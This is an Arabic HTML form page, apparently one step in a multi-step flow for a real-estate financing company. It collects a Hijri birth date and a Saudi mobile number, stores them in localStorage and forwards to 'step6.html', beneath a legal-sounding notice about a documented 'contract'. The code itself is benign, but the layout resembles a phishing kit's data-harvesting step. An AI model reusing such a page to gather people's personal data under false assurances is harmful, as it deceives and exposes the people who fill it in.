<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <title>تاريخ الميلاد ورقم الجوال</title>
  <style>
    body {
      font-family: 'Tajawal', sans-serif;
      background-color: #f9f9f9;
      color: #004d40;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 650px;
      margin: 40px auto;
      background-color: #fff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      border: 2px solid #004d40;
    }
    .company-name {
      background-color: #e6f9ec;
      padding: 10px;
      text-align: center;
      font-size: 24px;
      font-weight: bold;
      color: #006400;
      margin-bottom: 20px;
    }
    label {
      display: block;
      font-size: 18px;
      margin-top: 15px;
    }
    select, input {
      width: 100%;
      padding: 12px;
      font-size: 16px;
      border-radius: 8px;
      border: 1px solid #ccc;
      margin-top: 10px;
    }
    button {
      width: 100%;
      padding: 15px;
      font-size: 18px;
      background-color: #00796b;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 20px;
    }
    button:disabled {
      background-color: #ccc;
      cursor: not-allowed;
    }
    .alert {
      background-color: #fff3cd;
      border: 1px solid #ffeeba;
      padding: 15px;
      border-radius: 8px;
      font-size: 16px;
      color: #856404;
      margin-top: 20px;
    }
    footer {
      margin-top: 30px;
      padding-top: 10px;
      border-top: 1px solid #ccc;
      font-size: 14px;
      text-align: center;
      color: #777;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="company-name">سرعة تملك العقار والحلول التمويلية المتكاملة</div>

    <label>تاريخ الميلاد (هجري):</label>
    <select id="day" onchange="checkAllFields()">
      <option value="">اليوم</option>
    </select>
    <select id="month" onchange="checkAllFields()">
      <option value="">الشهر</option>
    </select>
    <select id="year" onchange="checkAllFields()">
      <option value="">السنة</option>
    </select>

    <label for="mobile">رقم الجوال:</label>
    <input type="tel" id="mobile" placeholder="05XXXXXXXX" maxlength="10" oninput="checkAllFields()" />

    <button id="nextBtn" onclick="saveAndNext()" disabled>اكمل</button>

    <div class="alert">
      ⚠️ <strong>تنبيه:</strong> يتم حماية هذا العقد وتوثيقه بموجب <strong>المادة التاسعة من نظام المعاملات الإلكترونية</strong>، ويُعد سجلًا إلكترونيًا موثقًا وحجة نظامية معتبرة في الإثبات أمام الجهات الرسمية.
    </div>

    <footer>
      <p id="dateTime"></p>
      <p>جميع الحقوق محفوظة لشركة سرعة تملك العقار</p>
    </footer>
  </div>

  <script>
    function populateSelects() {
      for (let d = 1; d <= 30; d++) {
        document.getElementById("day").innerHTML += `<option value="${d}">${d}</option>`;
      }
      const months = ["محرم", "صفر", "ربيع أول", "ربيع آخر", "جمادى أول", "جمادى آخر", "رجب", "شعبان", "رمضان", "شوال", "ذو القعدة", "ذو الحجة"];
      months.forEach((m, i) => {
        document.getElementById("month").innerHTML += `<option value="${i+1}">${m}</option>`;
      });
      for (let y = 1370; y <= 1446; y++) {
        document.getElementById("year").innerHTML += `<option value="${y}">${y}</option>`;
      }
    }

    function checkAllFields() {
      const day = document.getElementById("day").value;
      const month = document.getElementById("month").value;
      const year = document.getElementById("year").value;
      const mobile = document.getElementById("mobile").value;
      const isMobileValid = /^05\d{8}$/.test(mobile);
      document.getElementById("nextBtn").disabled = !(day && month && year && isMobileValid);
    }

    function saveAndNext() {
      const dateHijri = `${document.getElementById("day").value}/${document.getElementById("month").value}/${document.getElementById("year").value}`;
      const mobile = document.getElementById("mobile").value;
      localStorage.setItem("birthHijri", dateHijri);
      localStorage.setItem("mobile", mobile);
      window.location.href = "step6.html";
    }

    function updateDateTime() {
      const now = new Date();
      const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
      const time = now.toLocaleTimeString('ar-EG');
      const date = now.toLocaleDateString('ar-EG', options);
      document.getElementById("dateTime").textContent = `التاريخ: ${date} - الوقت: ${time}`;
    }

    populateSelects();
    updateDateTime();
    setInterval(updateDateTime, 1000);
  </script>
</body>
</html>
